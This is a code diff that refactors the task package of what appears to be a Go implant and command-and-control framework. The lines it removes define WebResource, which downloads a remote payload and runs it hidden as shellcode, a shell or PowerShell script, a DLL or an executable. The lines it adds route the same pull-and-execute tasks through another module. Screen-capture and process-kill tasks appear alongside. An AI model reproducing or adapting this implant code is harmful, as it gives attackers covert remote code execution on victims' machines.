@@ -19,12 +19,8 @@ package task
 import (
 	"context"
 	"io"
-	"net"
-	"net/http"
-	"net/url"
 	"os"
 	"strings"
-	"sync"
 	"time"
 
 	"github.com/iDigitalFlame/xmt/cmd"
@@ -36,11 +32,8 @@ import (
 	"github.com/iDigitalFlame/xmt/device/screen"
 	"github.com/iDigitalFlame/xmt/man"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
-	"github.com/iDigitalFlame/xmt/util/text"
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
-
-const timeout = time.Second * 15
 
 const (
 	taskIoDelete    uint8 = 0
@@ -51,11 +44,6 @@ const (
 	taskIoKill
 	taskIoKillName
 )
-
-var client struct {
-	sync.Once
-	v *http.Client
-}
 
 var (
 	_ Callable = (*DLL)(nil)
@@ -82,21 +70,6 @@ type Callable interface {
 func (DLL) task() uint8 {
 	return TvDLL
 }
-func initDefaultClient() {
-	client.v = &http.Client{
-		Transport: &http.Transport{
-			Proxy:                 device.Proxy,
-			DialContext:           (&net.Dialer{Timeout: timeout, KeepAlive: timeout, DualStack: true}).DialContext,
-			MaxIdleConns:          64,
-			IdleConnTimeout:       timeout,
-			DisableKeepAlives:     true,
-			ForceAttemptHTTP2:     false,
-			TLSHandshakeTimeout:   timeout,
-			ExpectContinueTimeout: timeout,
-			ResponseHeaderTimeout: timeout,
-		},
-	}
-}
 func (Zombie) task() uint8 {
 	return TvZombie
 }
@@ -106,46 +79,7 @@ func (Process) task() uint8 {
 func (Assembly) task() uint8 {
 	return TvAssembly
 }
-func rawParse(r string) (*url.URL, error) {
-	var (
-		i   = strings.IndexRune(r, '/')
-		u   *url.URL
-		err error
-	)
-	if i == 0 && len(r) > 2 && r[1] != '/' {
-		u, err = url.Parse("/" + r)
-	} else if i == -1 || i+1 >= len(r) || r[i+1] != '/' {
-		u, err = url.Parse("//" + r)
-	} else {
-		u, err = url.Parse(r)
-	}
-	if err != nil {
-		return nil, err
-	}
-	if len(u.Host) == 0 {
-		return nil, xerr.Sub("empty host field", 0x65)
-	}
-	if u.Host[len(u.Host)-1] == ':' {
-		return nil, xerr.Sub("invalid port specified", 0x66)
-	}
-	if len(u.Scheme) == 0 {
-		u.Scheme = com.NameHTTP
-	}
-	return u, nil
-}
-func request(u, a string, r *http.Request) (*http.Response, error) {
-	client.Do(initDefaultClient)
-	if len(a) > 0 {
-		r.Header.Set(userAgent, text.Matcher(a).String())
-	} else {
-		r.Header.Set(userAgent, userValue)
-	}
-	var err error
-	if r.URL, err = rawParse(u); err != nil {
-		return nil, err
-	}
-	return client.v.Do(r)
-}
+
 func taskWait(x context.Context, r data.Reader, _ data.Writer) error {
 	d, err := r.Int64()
 	if err != nil {
@@ -176,14 +110,11 @@ func taskPull(x context.Context, r data.Reader, w data.Writer) error {
 	if err = r.ReadString(&p); err != nil {
 		return err
 	}
-	var (
-		h, _ = http.NewRequestWithContext(x, http.MethodGet, "*", nil)
-		o    *http.Response
-	)
-	if o, err = request(u, a, h); err != nil {
+	o, err := man.WebRequest(x, u, a)
+	if err != nil {
 		return err
 	}
-	if o.StatusCode >= http.StatusBadRequest {
+	if o.StatusCode >= 400 {
 		o.Body.Close()
 		return xerr.Sub("invalid HTTP response", 0x67)
 	}
@@ -284,7 +215,15 @@ func taskPullExec(x context.Context, r data.Reader, w data.Writer) error {
 	if err = filter.UnmarshalStream(r, &f); err != nil {
 		return err
 	}
-	e, p, err := WebResource(x, w, z, a, u)
+	var (
+		e cmd.Runnable
+		p string
+	)
+	if z {
+		e, p, err = man.WebExec(x, w, u, a)
+	} else {
+		e, p, err = man.WebExec(x, nil, u, a)
+	}
 	if err != nil {
 		if len(p) > 0 {
 			os.Remove(p)
@@ -464,85 +403,4 @@ func taskZeroTrace(_ context.Context, _ data.Reader, _ data.Writer) error {
 }
 func taskScreenShot(_ context.Context, _ data.Reader, w data.Writer) error {
 	return screen.Capture(w)
-}
-
-// WebResource will attempt to download the URL target at 'url' and parse the
-// data into a Runnable interface.
-//
-// The supplied 'agent' string (if non-empty) will specify the User-Agent header
-// string to be used.
-//
-// The passed Writer will be passed as Stdout/Stderr to certain processes if
-// the 'z' flag is true.
-//
-// The returned string is the full expanded path if a temporary file is created.
-// It's the callers responsibility to delete this file when not needed.
-//
-// This function uses the 'man.ParseDownloadHeader' function to assist with
-// determining the executable type.
-func WebResource(x context.Context, w data.Writer, z bool, agent, url string) (cmd.Runnable, string, error) {
-	var (
-		r, _   = http.NewRequestWithContext(x, http.MethodGet, "*", nil)
-		o, err = request(url, agent, r)
-	)
-	if err != nil {
-		return nil, "", err
-	}
-	b, err := io.ReadAll(o.Body)
-	if o.Body.Close(); err != nil {
-		return nil, "", err
-	}
-	if bugtrack.Enabled {
-		bugtrack.Track("task.WebResource(): Download agent=%s, url=%s", agent, url)
-	}
-	var d bool
-	switch man.ParseDownloadHeader(o.Header) {
-	case 1:
-		d = true
-	case 2:
-		if bugtrack.Enabled {
-			bugtrack.Track("task.WebResource(): Download is shellcode url=%s", url)
-		}
-		return cmd.NewAsmContext(x, b), "", nil
-	case 3:
-		c := cmd.NewProcessContext(x, device.Shell, device.ShellArgs, string(b))
-		if c.SetWindowDisplay(0); z {
-			c.Stdout, c.Stderr = w, w
-		}
-		return c, "", nil
-	case 4:
-		c := cmd.NewProcessContext(x, device.PowerShell, pwsh, string(b))
-		if c.SetWindowDisplay(0); z {
-			c.Stdout, c.Stderr = w, w
-		}
-		return c, "", nil
-	}
-	var n string
-	if d {
-		n = execB
-	} else if device.OS == device.Windows {
-		n = execC
-	} else {
-		n = execA
-	}
-	f, err := os.CreateTemp("", n)
-	if err != nil {
-		return nil, "", err
-	}
-	n = f.Name()
-	_, err = f.Write(b)
-	if f.Close(); err != nil {
-		return nil, n, err
-	}
-	if bugtrack.Enabled {
-		bugtrack.Track("task.WebResource(): Download to tempfile url=%s, n=%s", url, n)
-	}
-	if os.Chmod(n, 0755); d {
-		return cmd.NewDLLContext(x, n), n, nil
-	}
-	c := cmd.NewProcessContext(x, n)
-	if c.SetWindowDisplay(0); z {
-		c.Stdout, c.Stderr = w, w
-	}
-	return c, n, nil
 }
